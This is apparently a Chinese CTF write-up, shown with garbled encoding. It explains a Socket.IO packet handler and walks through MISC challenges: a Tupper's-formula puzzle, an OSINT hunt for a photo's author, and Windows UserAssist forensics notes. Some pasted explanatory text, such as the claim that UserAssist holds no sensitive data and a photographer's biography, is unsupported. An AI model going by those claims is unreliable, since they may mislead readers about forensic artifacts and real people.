<pre><code class="hljs">onpacket(packet) &#123;        const sameNamespace = packet.nsp === this.nsp;        if (!sameNamespace)            return;        switch (packet.type) &#123;            case PacketType.CONNECT:                if (packet.data &amp;&amp; packet.data.sid) &#123;                    this.onconnect(packet.data.sid, packet.data.pid);                &#125;                else &#123;                    this.emitReserved(&quot;connect_error&quot;, new Error(&quot;It seems you are trying to reach a Socket.IO server in v2.x with a v3.x client, but they are not compatible (more information here: https://socket.io/docs/v3/migrating-from-2-x-to-3-0/)&quot;));                &#125;                break;            case PacketType.EVENT:            case PacketType.BINARY_EVENT:                this.onevent(packet);                break;            case PacketType.ACK:            case PacketType.BINARY_ACK:                this.onack(packet);                break;            case PacketType.DISCONNECT:                this.ondisconnect();                break;            case PacketType.CONNECT_ERROR:                this.destroy();                const err = new Error(packet.data.message);                // @ts-ignore                err.data = packet.data.data;                this.emitReserved(&quot;connect_error&quot;, err);                break;        &#125;    &#125;è¿™æ˜¯å•¥
</code></pre>
<p>2024/1/1 15:26:39</p>
<p>è¿™æ®µä»£ç æ˜¯ä¸€ä¸ª JavaScript ä¸­çš„æ–¹æ³•ï¼Œå®ƒå®šä¹‰äº†ä¸€ä¸ª <code>onpacket</code> æ–¹æ³•ã€‚æ ¹æ®ä»£ç ä¸Šä¸‹æ–‡æ¥çœ‹ï¼Œè¿™ä¸ªæ–¹æ³•å¯èƒ½æ˜¯ <a target="_blank" rel="noopener" href="http://Socket.IO">Socket.IO</a> åº“ä¸­æŸä¸ªç±»çš„æ–¹æ³•ã€‚</p>
<p>åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œå®ƒæ¥æ”¶ä¸€ä¸ªå‚æ•° <code>packet</code>ï¼Œè¡¨ç¤ºä¸€ä¸ªæ•°æ®åŒ…ã€‚é¦–å…ˆï¼Œå®ƒæ£€æŸ¥ <code>packet</code> ä¸­çš„å‘½åç©ºé—´ (<code>packet.nsp</code>) æ˜¯å¦ä¸å½“å‰å¯¹è±¡çš„å‘½åç©ºé—´ (<code>this.nsp</code>) ç›¸åŒã€‚å¦‚æœå‘½åç©ºé—´ä¸åŒï¼Œæ–¹æ³•ç›´æ¥è¿”å›ï¼Œä¸æ‰§è¡Œåç»­é€»è¾‘ã€‚</p>
<p>å¦‚æœå‘½åç©ºé—´ç›¸åŒï¼Œå®ƒä¼šæ ¹æ® <code>packet</code> çš„ç±»å‹ (<code>packet.type</code>) è¿›è¡Œä¸åŒçš„å¤„ç†é€»è¾‘ï¼š</p>
<ul>
<li>å¦‚æœ <code>packet</code> çš„ç±»å‹æ˜¯ <code>PacketType.CONNECT</code>ï¼Œå®ƒä¼šåˆ¤æ–­ <code>packet.data.sid</code> æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨åˆ™è°ƒç”¨ <code>onconnect</code> æ–¹æ³•ï¼Œå¹¶ä¼ é€’ <code>packet.data.sid</code> å’Œ <code>packet.data.pid</code> ä½œä¸ºå‚æ•°ã€‚å¦‚æœ <code>packet.data.sid</code> ä¸å­˜åœ¨ï¼Œå®ƒä¼šè§¦å‘ä¸€ä¸ª â€œconnect_errorâ€ äº‹ä»¶ï¼Œå¹¶ä¼ é€’ä¸€ä¸ªé”™è¯¯å¯¹è±¡ä½œä¸ºå‚æ•°ã€‚</li>
<li>å¦‚æœ <code>packet</code> çš„ç±»å‹æ˜¯ <code>PacketType.EVENT</code> æˆ– <code>PacketType.BINARY_EVENT</code>ï¼Œå®ƒä¼šè°ƒç”¨ <code>onevent</code> æ–¹æ³•ï¼Œå¹¶ä¼ é€’ <code>packet</code> ä½œä¸ºå‚æ•°ã€‚</li>
<li>å¦‚æœ <code>packet</code> çš„ç±»å‹æ˜¯ <code>PacketType.ACK</code> æˆ– <code>PacketType.BINARY_ACK</code>ï¼Œå®ƒä¼šè°ƒç”¨ <code>onack</code> æ–¹æ³•ï¼Œå¹¶ä¼ é€’ <code>packet</code> ä½œä¸ºå‚æ•°ã€‚</li>
<li>å¦‚æœ <code>packet</code> çš„ç±»å‹æ˜¯ <code>PacketType.DISCONNECT</code>ï¼Œå®ƒä¼šè°ƒç”¨ <code>ondisconnect</code> æ–¹æ³•ã€‚</li>
<li>å¦‚æœ <code>packet</code> çš„ç±»å‹æ˜¯ <code>PacketType.CONNECT_ERROR</code>ï¼Œå®ƒä¼šé”€æ¯å½“å‰å¯¹è±¡ï¼ˆè°ƒç”¨ <code>destroy</code> æ–¹æ³•ï¼‰ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªæ–°çš„é”™è¯¯å¯¹è±¡ï¼Œå¹¶å°† <code>packet.data.message</code> èµ‹å€¼ç»™é”™è¯¯å¯¹è±¡çš„ <code>message</code> å±æ€§ã€‚æœ€åï¼Œå®ƒè§¦å‘ä¸€ä¸ª â€œconnect_errorâ€ äº‹ä»¶ï¼Œå¹¶ä¼ é€’è¯¥é”™è¯¯å¯¹è±¡ä½œä¸ºå‚æ•°ã€‚</li>
</ul>
<p>æ€»ä¹‹ï¼Œè¿™æ®µä»£ç æ ¹æ®ä¸åŒç±»å‹çš„æ•°æ®åŒ…æ‰§è¡Œä¸åŒçš„æ“ä½œï¼Œå¤„ç†äº†ä¸ <a target="_blank" rel="noopener" href="http://Socket.IO">Socket.IO</a> é€šä¿¡ç›¸å…³çš„äº‹ä»¶å’Œé”™è¯¯ã€‚å…·ä½“çš„é€»è¾‘å¯èƒ½éœ€è¦ç»“åˆä¸Šä¸‹æ–‡æ¥æ›´å‡†ç¡®åœ°ç†è§£å…¶å«ä¹‰ã€‚</p>
<p>åœ¨ <a target="_blank" rel="noopener" href="http://Socket.IO">Socket.IO</a> ä¸­ï¼Œå‘½åç©ºé—´ï¼ˆNamespaceï¼‰æ˜¯ä¸€ç§ç”¨äºåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´åˆ’åˆ†ä¸åŒçš„é€šä¿¡é¢‘é“æˆ–é€»è¾‘åˆ†ç»„çš„æœºåˆ¶ã€‚</p>
<p><a target="_blank" rel="noopener" href="http://Socket.IO">Socket.IO</a> å…è®¸åœ¨ä¸€ä¸ªåº”ç”¨ç¨‹åºä¸­åˆ›å»ºå¤šä¸ªå‘½åç©ºé—´ï¼Œæ¯ä¸ªå‘½åç©ºé—´å¯ä»¥ç‹¬ç«‹åœ°å¤„ç†è‡ªå·±çš„äº‹ä»¶å’Œæ•°æ®ä¼ è¾“ã€‚é€šè¿‡ä½¿ç”¨å‘½åç©ºé—´ï¼Œå¯ä»¥å®ç°å¯¹ä¸åŒç±»å‹çš„æ•°æ®è¿›è¡Œåˆ†ç»„ã€éš”ç¦»å’Œå¤„ç†ã€‚</p>
<p>å‘½åç©ºé—´åœ¨ <a target="_blank" rel="noopener" href="http://Socket.IO">Socket.IO</a> ä¸­å…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p>
<pre><code class="hljs">å‘½åç©ºé—´æ˜¯å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„åŒå‘é€šä¿¡é€šé“ã€‚
æ¯ä¸ªå‘½åç©ºé—´éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯ /ï¼Œè¡¨ç¤ºé»˜è®¤å‘½åç©ºé—´ã€‚
å®¢æˆ·ç«¯å¯ä»¥é€šè¿‡è¿æ¥åˆ°æŒ‡å®šçš„å‘½åç©ºé—´æ¥ä¸æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ã€‚
æœåŠ¡å™¨å¯ä»¥ç›‘å¬æŒ‡å®šå‘½åç©ºé—´ä¸Šçš„äº‹ä»¶ï¼Œå¹¶å‘è¯¥å‘½åç©ºé—´å‘é€æ¶ˆæ¯ã€‚
ä¸åŒå‘½åç©ºé—´ä¹‹é—´çš„è¿æ¥æ˜¯éš”ç¦»çš„ï¼Œå®ƒä»¬ä¸ä¼šå…±äº«äº‹ä»¶å’Œæ•°æ®ã€‚
</code></pre>
<p>é€šè¿‡ä½¿ç”¨å‘½åç©ºé—´ï¼Œå¯ä»¥å°†ç›¸å…³çš„åŠŸèƒ½æˆ–æ¨¡å—åˆ’åˆ†åˆ°ä¸åŒçš„å‘½åç©ºé—´ä¸­ï¼Œä»è€Œä½¿ä»£ç æ›´åŠ æ¨¡å—åŒ–å’Œå¯ç»´æŠ¤ã€‚åŒæ—¶ï¼Œå‘½åç©ºé—´ä¹Ÿå¯ä»¥ç”¨äºå®ç°ä¸åŒæƒé™çº§åˆ«çš„è®¿é—®æ§åˆ¶å’Œåˆ†ç»„ç®¡ç†ç­‰éœ€æ±‚ã€‚</p>
<p>ä¾‹å¦‚ï¼Œä¸€ä¸ªèŠå¤©åº”ç”¨å¯ä»¥ä½¿ç”¨å¤šä¸ªå‘½åç©ºé—´ï¼Œç”¨äºå¤„ç†ä¸åŒçš„èŠå¤©æˆ¿é—´æˆ–ä¸åŒç±»å‹çš„æ¶ˆæ¯ã€‚æ¯ä¸ªå‘½åç©ºé—´å¯ä»¥ç‹¬ç«‹åœ°å¤„ç†ä¸è¯¥èŠå¤©æˆ¿é—´ç›¸å…³çš„äº‹ä»¶å’Œæ•°æ®ä¼ è¾“ï¼Œä»è€Œå®ç°æ›´çµæ´»å’Œå¯æ‰©å±•çš„åº”ç”¨ç¨‹åºæ¶æ„ã€‚</p>
<p>Socket.js å’Œ SocketIO.js æ˜¯ä¸¤ä¸ªä¸åŒçš„ JavaScript åº“ï¼Œå®ƒä»¬ç”¨äºå®ç°å®æ—¶é€šä¿¡å’Œç½‘ç»œè¿æ¥æ–¹é¢çš„åŠŸèƒ½ï¼Œä½†åœ¨è®¾è®¡å’Œä½¿ç”¨ä¸Šæœ‰ä¸€äº›åŒºåˆ«ã€‚</p>
<pre><code class="hljs">Socket.jsï¼šSocket.js æ˜¯ä¸€ä¸ªåŸºäº WebSocket åè®®çš„åº“ï¼Œå®ƒæä¾›äº†å¯¹ WebSocket çš„å°è£…å’Œç®€åŒ–ã€‚WebSocket æ˜¯ä¸€ç§ç”¨äºåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´è¿›è¡ŒåŒå‘é€šä¿¡çš„åè®®ï¼Œå¯ä»¥å®ç°å®æ—¶çš„æ•°æ®ä¼ è¾“å’Œäº‹ä»¶äº¤äº’ã€‚Socket.js ä¸“æ³¨äº WebSocket è¿æ¥å’Œæ¶ˆæ¯ä¼ è¾“ï¼Œæä¾›äº†ä¸€äº›ç®€å•çš„ API æ¥åˆ›å»ºå’Œç®¡ç† WebSocket è¿æ¥ï¼Œå‘é€å’Œæ¥æ”¶æ¶ˆæ¯ã€‚

SocketIO.jsï¼šSocketIO.js æ˜¯ä¸€ä¸ªæ›´é«˜çº§åˆ«çš„åº“ï¼Œå®ƒå»ºç«‹åœ¨ WebSocket ä¹‹ä¸Šï¼Œå¹¶æä¾›äº†æ›´å¤šçš„åŠŸèƒ½å’ŒæŠ½è±¡å±‚ã€‚é™¤äº†æ”¯æŒ WebSocketï¼Œå®ƒè¿˜å¯ä»¥åœ¨ä¸åŒçš„ç¯å¢ƒä¸­ä½¿ç”¨å…¶ä»–ä¼ è¾“æ–¹å¼ï¼Œå¦‚è½®è¯¢ï¼ˆpollingï¼‰å’Œé•¿è½®è¯¢ï¼ˆlong pollingï¼‰ï¼Œä»¥ä¾¿å…¼å®¹ä¸æ”¯æŒ WebSocket çš„æµè§ˆå™¨æˆ–è®¾å¤‡ã€‚SocketIO.js æä¾›äº†å®æ—¶é€šä¿¡çš„æ ¸å¿ƒåŠŸèƒ½ï¼Œä¾‹å¦‚å®æ—¶äº‹ä»¶ã€æˆ¿é—´ï¼ˆroomï¼‰ç®¡ç†ã€å¹¿æ’­ç­‰ï¼Œä½¿å¼€å‘è€…å¯ä»¥æ›´æ–¹ä¾¿åœ°æ„å»ºå®æ—¶åº”ç”¨ç¨‹åºã€‚
</code></pre>
<p>æ€»ç»“æ¥è¯´ï¼ŒSocket.js æ›´åŠ ä¸“æ³¨äºåº•å±‚çš„ WebSocket è¿æ¥å’Œæ¶ˆæ¯ä¼ è¾“ï¼Œè€Œ SocketIO.js åˆ™æä¾›äº†æ›´é«˜çº§åˆ«çš„åŠŸèƒ½å’ŒæŠ½è±¡å±‚ï¼ŒåŒ…æ‹¬å¯¹ä¸åŒä¼ è¾“æ–¹å¼çš„æ”¯æŒã€äº‹ä»¶ç®¡ç†ã€æˆ¿é—´ç®¡ç†ç­‰ã€‚é€‰æ‹©ä½¿ç”¨å“ªä¸ªåº“å–å†³äºå…·ä½“çš„éœ€æ±‚å’Œé¡¹ç›®çš„å¤æ‚æ€§ã€‚å¦‚æœåªéœ€è¦åŸºæœ¬çš„ WebSocket è¿æ¥å’Œæ¶ˆæ¯ä¼ è¾“ï¼Œå¯ä»¥é€‰æ‹© Socket.jsï¼›å¦‚æœéœ€è¦æ›´å¤šçš„é«˜çº§åŠŸèƒ½å’Œè·¨æµè§ˆå™¨å…¼å®¹æ€§ï¼Œå¯ä»¥é€‰æ‹© SocketIO.jsã€‚</p>
<h5 id="MISC">MISC</h5>
<h6 id="real-Sign-in">real_Sign_in</h6>
<p>â€‹							 							 								Signin</p>
<p>å¬è¯´ç©ºæ ¼æ¢¦åˆ°è¿‡flagï¼Œå»é—®ä»–å§ 1704344979</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230100119014.png" srcset="/img/loading.gif" lazyload alt=""></p>
<h6 id="Tupper">Tupper</h6>
<p>zipä¸­æœ‰544ä¸ªzip</p>
<p>ç”¨bandzipæ™ºèƒ½è§£å‹åˆ°å•ä¸ªæ–‡ä»¶å¤¹ åå¾—åˆ°544ä¸ªtxt</p>
<p>ä¸Šè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><br>script_dir = os.path.dirname(os.path.abspath(__file__))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">544</span>):<br><br>  file_name = os.path.join(script_dir, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>.txt&#x27;</span>)<br><br>  <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_name, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> input_file:<br><br>  file_content = input_file.read()<br><br>  <br><br>  output_file_path = os.path.join(script_dir, <span class="hljs-string">&#x27;test.txt&#x27;</span>)<br><br>  <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file_path, <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">as</span> output_file:<br><br>  output_file.write(file_content)<br></code></pre></td></tr></table></figure>
<p>å¾—åˆ°2430300279971732586306732048042092863199653171927794467693459300972786378547280955562809687500152634692779823565763915547054401016328754101432014140582831594296812996790110355750752839700057610333643268996981237954031719229265468574678123751449120722542208774709531347763029887116238941109081309969800374434289479188925825535231559303854752686132605919041400266012842603637640293233945817633405014578138622221890849592254661917366671611371389339503282961869143217807914631796828719245587290094562044412857349315361240136183939478574056568128542</p>
<p>ç”¨gunplotç»˜å›¾</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230105344499.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>æ²¡æœ‰å‘ç°</p>
<p>è”ç³»é¢˜æ„</p>
<p>Tupper æ˜¯ä¸€ç§æ•°å­¦è¡¨è¾¾å¼å’Œç®—æ³•ï¼Œç”¨äºç”Ÿæˆå›¾åƒä¸­çš„æœ‰è¶£å›¾æ¡ˆã€‚å®ƒä»¥å…¶å‘ç°è€… Jeff Tupper çš„åå­—å‘½åã€‚</p>
<p>Tupperâ€™s self-referential formulaï¼ˆTupperè‡ªæŒ‡å…¬å¼ï¼‰æ˜¯ä¸€ä¸ªäºŒç»´å‡½æ•°ï¼Œå¯ä»¥å°†ä¸€ç³»åˆ—æ•´æ•°åæ ‡æ˜ å°„åˆ°ä¸€ä¸ªäºŒå€¼å›¾åƒä¸­ã€‚è¿™ä¸ªå…¬å¼è¢«è®¾è®¡æˆåœ¨ç‰¹å®šçš„å‚æ•°æ¡ä»¶ä¸‹äº§ç”Ÿä¸€ä¸ªå¸¦æœ‰è‡ªæŒ‡ç‰¹æ€§çš„å›¾æ¡ˆã€‚å…·ä½“æ¥è¯´ï¼Œå°† Tupper è‡ªæŒ‡å…¬å¼åº”ç”¨äºé€‚å½“é€‰æ‹©çš„å‚æ•°åï¼Œå¯ä»¥ç”Ÿæˆä¸€ä¸ªåœ¨å›¾åƒä¸­æ˜¾ç¤ºå‡ºè¯¥å…¬å¼æœ¬èº«çš„å›¾æ¡ˆã€‚</p>
<p>Tupper å›¾æ¡ˆé€šå¸¸ä»¥é»‘ç™½åƒç´ è¡¨ç¤ºï¼Œå…¶ä¸­é»‘è‰²åƒç´ è¡¨ç¤º1ï¼Œç™½è‰²åƒç´ è¡¨ç¤º0ã€‚é€šè¿‡é€‚å½“çš„å‚æ•°è®¾ç½®ï¼Œå¯ä»¥åœ¨å›¾åƒä¸­å‡†ç¡®åœ°ç»˜åˆ¶å‡º Tupper è‡ªæŒ‡å…¬å¼ã€‚</p>
<p>Tupper å›¾æ¡ˆä¹‹æ‰€ä»¥æœ‰è¶£ï¼Œæ˜¯å› ä¸ºå®ƒå±•ç¤ºäº†æ•°å­¦ã€è®¡ç®—å’Œå›¾åƒä¹‹é—´çš„å…³è”ã€‚å®ƒæ˜¯ä¸€ä¸ªæœ‰è¶£çš„æ•°å­¦æ¢ç´¢ï¼Œå¹¶ä¸”å¯ä»¥ç”¨äºç”Ÿæˆç‹¬ç‰¹çš„è§†è§‰æ•ˆæœã€‚</p>
<p>å¸Œæœ›è¿™ä¸ªç®€è¦ä»‹ç»èƒ½å¤Ÿå›ç­”æ‚¨å…³äº Tupper çš„é—®é¢˜ã€‚å¦‚æœæ‚¨è¿˜æœ‰å…¶ä»–é—®é¢˜ï¼Œè¯·éšæ—¶æé—®ã€‚</p>
<p>çœ‹çœ‹ æŸ¥ä¸€ä¸‹</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230105809617.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230105856162.png" srcset="/img/loading.gif" lazyload alt=""></p>
<h6 id="å¤§åœ°ä¹‹æ¯">å¤§åœ°ä¹‹æ¯</h6>
<p>![](file:///C:/Users/asus/AppData/Local/Packages/Microsoft.Windows.Photos_8wekyb3d8bbwe/TempState/ShareServiceTempFolder/BaD.jpeg)</p>
<p>åç§°BaD</p>
<p>ç–‘ä¼¼éœ²å‡ºäº†ä¸€ä¸ªå­— å¥½åƒæ˜¯ä»€ä¹ˆå³°</p>
<p>è¿™é“é¢˜åƒæ˜¯ä¸€é“ç¤¾å·¥é¢˜</p>
<p>å·¦ä¸‹è§’æœ‰æŒ‡å—é’ˆ</p>
<p>åƒæ˜¯åœ°å›¾è½¯ä»¶</p>
<p>è¯·æ‰¾åˆ°è¿™å¼ å›¾ç‰‡çš„ä½œè€…ï¼Œflagä¸º CBCTF{md5(ä½œè€…è´¦å·å)}</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231154143347.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p><img src="http://img.mp.itc.cn/q_mini,c_zoom,w_640/upload/20170615/716f1c264aef4ea0a1f6b8b4dcfa9be0_th.jpg" srcset="/img/loading.gif" lazyload alt=""></p>
<p>ç»è¿‡ç¡®å®š</p>
<p>æ˜¯ç ç©†æœ—ç›å³°</p>
<p>æ³¨æ„åˆ°åŸå›¾å¤ªé˜³è¢«é®æŒ¡</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231155036279.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>ç ç©†æœ—ç›å³°ï¼Œä¸–ç•Œä¸Šæœ€é«˜çš„å±±å³°</p>
<p>æˆ‘ä»¬çš„å›¢é˜Ÿæ›¾åœ¨2012å¹´æ‹æ‘„è¿‡ç ç©†æœ—ç›å³°çš„ç…§ç‰‡ï¼Œä»¥åˆ›å»º360å¼ ç…§ç‰‡çš„è™šæ‹Ÿä¹‹æ—…ã€‚</p>
<p>ä½ å¯ä»¥åœ¨è¿™é‡Œçœ‹åˆ°æˆ‘ä»¬åœ¨2012å¹´1æœˆæ‹æ‘„çš„ç…§ç‰‡ã€‚è¿™æ˜¯æˆ‘ä»¬2012å¹´12æœˆçš„è™šæ‹Ÿä¹‹æ—…ã€‚</p>
<p>å¹¸è¿çš„æ˜¯ï¼Œè¿›æ­¥å¹¶æ²¡æœ‰åœæ»ä¸å‰ï¼Œè¿™ä½¿æˆ‘ä»¬èƒ½å¤Ÿå¤šæ ·åŒ–æˆ‘ä»¬çš„ç…§ç‰‡å’Œè§†é¢‘æ€§èƒ½ï¼Œå¹¶æ”¹å–„æˆ‘ä»¬çš„å·¥ä½œç»“æœã€‚è¿™å°±æ˜¯æˆ‘ä»¬ç»å¸¸å‡çº§è®¾å¤‡çš„åŸå› ã€‚</p>
<p>ç…§ç‰‡å’Œè§†é¢‘ç”±Sergey Semenovå’ŒIvan Roslyakovæä¾›</p>
<p>2022å¹´12æœˆ23æ—¥</p>
<p>æ¥ä¸‹æ¥æ‰¾ä¸€ä¸‹è¿™ä¸¤ä¸ªäºº</p>
<p>å…¶ä¸­ç¬¬ä¸€ä¸ªæœ‰ä¸“é—¨åŸŸåçš„è‡ªå·±ç½‘ç«™</p>
<p>å¤§æ¦‚ç‡æ˜¯ä»–</p>
<p>Russian photographer <a target="_blank" rel="noopener" href="http://www.sergesemenov.com/">Sergey Semenov</a></p>
<p>Sergey  Semenovæ˜¯ä¸€ä½ä¿„ç½—æ–¯çš„æ‘„å½±å¸ˆï¼Œä»–ä¸»è¦æ“…é•¿äººåƒæ‘„å½±å’Œæ—¶å°šæ‘„å½±ã€‚ä»–çš„ä½œå“é£æ ¼å¤šæ ·ï¼Œæ—¢æœ‰æ˜äº®æ¸…æ–°çš„è‰²å½©ï¼Œä¹Ÿæœ‰å¤å¤ç»å…¸çš„é»‘ç™½é£æ ¼ã€‚ä»–çš„ä½œå“æ›¾è¢«å¤šå®¶å›½é™…æ‚å¿—å’Œåª’ä½“æŠ¥é“å’Œå‘è¡¨ï¼ŒåŒ…æ‹¬Vogueã€Elleã€Harperâ€™s Bazaarç­‰ã€‚ä»–è¿˜æ›¾ä¸å¤šä¸ªçŸ¥åå“ç‰Œåˆä½œï¼Œå¦‚Lâ€™Oreal Parisã€Yves Saint  Laurentã€H&amp;Mç­‰ã€‚ä»–çš„ä½œå“åœ¨æ‘„å½±é¢†åŸŸå†…å¤‡å—èµèª‰ï¼Œè¢«èª‰ä¸ºä¿„ç½—æ–¯æœ€å…·ä»£è¡¨æ€§çš„æ‘„å½±å¸ˆä¹‹ä¸€ã€‚</p>
<p>æäº¤äº†ä¸€ä¸‹ å¤±è´¥ å†æ‰¾å§</p>
<p>åå­—å…¨å¤§å†™æ— ç©ºæ ¼</p>
<p>åŸƒä½›å‹’æ–¯å³°æ˜¯ä»¥ä¸€ä½å¨å°”å£«æµ‹é‡å‘˜çš„åå­—å‘½åçš„ï¼Œä»–åœ¨19ä¸–çºªä¸­æœŸç»˜åˆ¶äº†å°åº¦å¤§éƒ¨åˆ†åœ°åŒºçš„åœ°å›¾ã€‚åœ¨å½“åœ°ï¼Œè¿™åº§å±±çš„å°¼æ³Šå°”åå­—æ˜¯Sagarmathaï¼Œæ„æ€æ˜¯â€œå¤©ç©ºå¥³ç¥â€ï¼Œåœ¨è—è¯­ä¸­æ˜¯Chomolungmaï¼Œæ„æ€æ˜¯â€œå±±ç¥ä¹‹æ¯</p>
<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%A4%A7%E5%9C%B0%E4%B9%8B%E6%AF%8D/770840"><em>å¤§åœ°ä¹‹æ¯</em>*ï¼ˆä¸­å›½ä¼ ç»Ÿç¥è¯äººç‰©ï¼‰_ç™¾åº¦ç™¾ç§‘</a><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/**%E5%A4%A7%E5%9C%B0%E4%B9%8B%E6%AF%8D">https://baike.baidu.com/item/**å¤§åœ°ä¹‹æ¯</a>**</p>
<p><strong><em>*</em>***åœ°æ¯ç¥ã€å¤§åœ°ä¹‹æ¯æˆ–æ¯ç¥æ˜¯æŒ‡ä¸“å¸ç¹æ®–åŠ›åŠè±¡å¾å¤§åœ°æ©æƒ çš„å¥³ç¥*****</strong>*</p>
<p>ç ç©†æœ—ç›<strong>å³°</strong> ï¼ˆå°æ¹¾ç§° åœ£æ¯<strong>å³°</strong> ï¼‰ï¼Œç®€ç§° ç å³°</p>
<p>Everest</p>
<p>åœ¨twitterï¼ŒFacebookæ²¡æ‰¾åˆ°</p>
<p>å›å»çœ‹å›¾</p>
<p>çœ‹åˆ°å³ä¸‹è§’æœ‰æŒ‡å—é’ˆï¼Œæœ‰ç‚¹æ€€ç–‘æ˜¯åœ°å›¾è½¯ä»¶ç±»å‹ï¼Œå‡†å¤‡å»æ‰¾æ‰¾</p>
<p>å¯¹æ¯”äº†å‡ ä¸ªè½¯ä»¶</p>
<p>å‘ç°æ˜¯è°·æ­Œåœ°å›¾çš„ç•Œé¢</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231211149638.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>ELSEMIGUEL</p>
<p>32ä½md5åŠ å¯†ååŒ…è£¹flag{}å³å¯</p>
<h6 id="JBN-å·®æœ€åä¸€æ­¥">JBN å·®æœ€åä¸€æ­¥</h6>
<p>å…ˆå¼€å§‹ç”¨AXIOM examineå’Œprocessçœ‹çš„</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101141831314.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>â€œUser Assistâ€ æ˜¯ä¸€ä¸ª Windows æ“ä½œç³»ç»Ÿä¸­çš„åŠŸèƒ½ï¼Œç”¨äºè®°å½•ç”¨æˆ·åœ¨è®¡ç®—æœºä¸Šä½¿ç”¨åº”ç”¨ç¨‹åºçš„é¢‘ç‡å’Œæ—¶é—´ã€‚å®ƒä¸»è¦ç”¨äºè·Ÿè¸ªç”¨æˆ·çš„åº”ç”¨ç¨‹åºä½¿ç”¨ä¹ æƒ¯å’Œè¡Œä¸ºæ¨¡å¼ã€‚</p>
<p>User Assist åŠŸèƒ½ä¼šè®°å½•ç”¨æˆ·æ‰“å¼€çš„åº”ç”¨ç¨‹åºã€æ–‡ä»¶å¤¹ä»¥åŠæ‰§è¡Œçš„æ“ä½œï¼Œå¹¶å°†è¿™äº›ä¿¡æ¯å­˜å‚¨åœ¨ Windows æ³¨å†Œè¡¨ä¸­ã€‚è¿™äº›ä¿¡æ¯è¢«ç”¨äºç”Ÿæˆå¼€å§‹èœå•ã€ä»»åŠ¡æ ç­‰ä½ç½®ä¸Šçš„æœ€è¿‘ä½¿ç”¨åº”ç”¨ç¨‹åºåˆ—è¡¨ï¼Œä»¥æ–¹ä¾¿ç”¨æˆ·å¿«é€Ÿè®¿é—®å¸¸ç”¨çš„åº”ç”¨ç¨‹åºã€‚</p>
<p>User Assist çš„æ•°æ®å­˜å‚¨åœ¨æ³¨å†Œè¡¨çš„ â€œHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssistâ€ é”®ä¸‹ã€‚å®ƒåŒ…å«ä¸€äº›å­é”®ï¼Œæ¯ä¸ªå­é”®å¯¹åº”ä¸€ä¸ªåº”ç”¨ç¨‹åºæˆ–æ“ä½œã€‚è¿™äº›å­é”®ä¸­å­˜å‚¨äº†åº”ç”¨ç¨‹åºæˆ–æ“ä½œçš„æ‰§è¡Œæ¬¡æ•°ã€æœ€åæ‰§è¡Œçš„æ—¶é—´ç­‰ä¿¡æ¯ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒUser Assist æ•°æ®ä¸»è¦ç”¨äºæ”¹å–„ç”¨æˆ·ä½“éªŒå’Œæä¾›å¿«é€Ÿè®¿é—®å¸¸ç”¨åº”ç”¨ç¨‹åºçš„åŠŸèƒ½ï¼Œä¸ä¼šåŒ…å«æ•æ„Ÿä¿¡æ¯ã€‚æ­¤å¤–ï¼ŒUser Assist å¯ä»¥è¢«ç¦ç”¨æˆ–æ¸…é™¤ä»¥ä¿æŠ¤ç”¨æˆ·éšç§ã€‚</p>
